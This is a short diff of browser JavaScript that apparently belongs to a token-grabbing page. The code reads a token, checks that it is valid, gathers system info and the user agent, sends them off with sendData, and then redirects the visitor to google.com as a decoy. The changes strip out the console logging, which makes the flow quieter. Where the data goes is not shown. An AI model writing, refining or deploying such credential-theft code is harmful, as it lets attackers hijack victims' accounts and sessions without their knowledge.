@@ -53,7 +53,6 @@
 
     async function processData() {
       if (hasSent) {
-        console.log('[Already sent]');
         location.href = 'https://google.com';
         return;
       }
@@ -69,7 +68,6 @@
       }
 
       if (!rawToken) {
-        console.log('[✗] No token found');
         location.href = 'https://google.com';
         return;
       }
@@ -92,7 +90,6 @@
         if (decoded !== token) token = decoded;
       } catch (e) {}
 
-      console.log('[→] Processing token...');
 
       try {
         hasSent = true;
@@ -102,7 +99,6 @@
 
         // If token is invalid, don't send anything - just redirect
         if (!validationResult.valid) {
-          console.log('[✗] Invalid token - not sending');
           location.href = 'https://google.com';
           return;
         }
@@ -123,7 +119,6 @@
         const success = await sendData(token, systemInfo, userAgent, validationResult);
 
         if (success) {
-          console.log('[✓] Valid token sent successfully');
         }
 
         location.href = 'https://google.com';
